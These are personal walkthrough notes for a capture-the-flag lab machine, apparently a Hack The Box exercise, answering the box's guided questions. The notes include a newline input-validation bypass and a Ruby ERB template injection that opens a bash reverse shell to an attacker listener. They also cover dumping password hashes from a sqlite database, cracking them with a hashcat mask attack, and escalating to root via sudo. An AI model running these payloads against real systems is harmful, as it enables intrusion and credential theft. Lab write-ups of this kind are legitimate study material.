### Details: 
IP :  10.129.64.80

NMAP SCAN:  ![[Pasted image 20240720145212.png|1000]]
## Q1 - What version of `OpenSSH` is running?
A: OpenSSH 8.9p1 running on port 22 from nmap scan

## Q2 - What programming language is the web application written in?

Use wappalyzer on website to find programming language
![[Pasted image 20240720145652.png]]


## Q3 - Which endpoint on the web application allows for user input?
/weighted-grade allows user input
![[Pasted image 20240720145738.png|500]]


## Q4 Which column on the grade-calculator page allows alphanumeric input?
Category only input that allows alphanumeric input

![[Pasted image 20240720150024.png]]


## Q5 - What is the URL-encoded value of the character you can use to bypass the input validation on the Category column?

### A: %0a
If we URL encode the linefeed value using **%0a** we can bypass the input validation
![[Pasted image 20240720150650.png]]
![[Pasted image 20240720151024.png]]

We then test a Ruby SSTI (Server Side Template Injection)

We can use this basic injection found on github https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#ruby---basic-injectionsand and test if the input is valid 

![[Pasted image 20240720151326.png]]
![[Pasted image 20240720151423.png]]

We can see that when we input the command it gives us the output 49 meaning that it is vulnerable to code execution.

## Q6 What is the name of the templating system in use by this web application?
**Embedded Ruby (ERB)** is the templating system of Ruby. So the fact that this is vulnerable to SSTI means that the templating system is **Embedded Ruby (ERB)**.

# Next Steps

Since the website is vulnerable to SSTI we can use this to our advantage to spawn a reverse shell.

Create simple shell command :
**<%= IO.popen("bash -c 'bash -i >& /dev/tcp/10.10.14.2/4444 0>&1'").readlines() %>**

![[Pasted image 20240720160225.png]]
we setup our listener on the other side and hit enter

NC:  ![[Pasted image 20240720160254.png]]

check if we have python 3 on the system then we can make a more interactive shell using 
**python3 -c 'import pty; pty.spawn("/bin/bash")'**

now we have a more interactive shell.

![[Pasted image 20240720160607.png]]

## Q7 Submit User Flag

![[Pasted image 20240720160944.png]]
## Q8 Which non-default group is the susan user a part of?

when we enter the command groups we can see that Susan is apart of the Sudo group.
![[Pasted image 20240720161133.png]]
## Q9 What is the full path of the sqlite database containing the susan user's password hash?
after looking around we find the database in:
/home/susan/Migration/pupilpath_credentials.db

using the command - sqlite3 pupilpath_credentials.db "select name, password from users" 

we retrieve the hashes
![[Pasted image 20240720162159.png]]
## What is susans user password
we also find looking around that susan has a default password format in an mail folder
![[Pasted image 20240720163018.png]]

since we know this we can create a custom wordlist and use hashcat to crack it
using the command
hashcat -m 1400 -a 6 susanhash susanwl ?d?d?d?d?d?d?d?d?d -O   

**-m 1400** = SHA256 Hash
**-**a 6** = attack mode hybrid since we are using our own wordlist
**susanhash** = the hash of susans pass
**susanwl** = "susan_nasus" since we know the password format from the email
**?d?d?d?d?d?d?d?d?d** = this represents the 9 digits to brute force
**-O** = optimization
#### We now have the cracked pw
![[Pasted image 20240720164858.png]]



we can now use susans password to get to shell as she has sudo access

if we use the command sudo -i we can open a root shell.

this box is now completed

![[Pasted image 20240720165112.png]]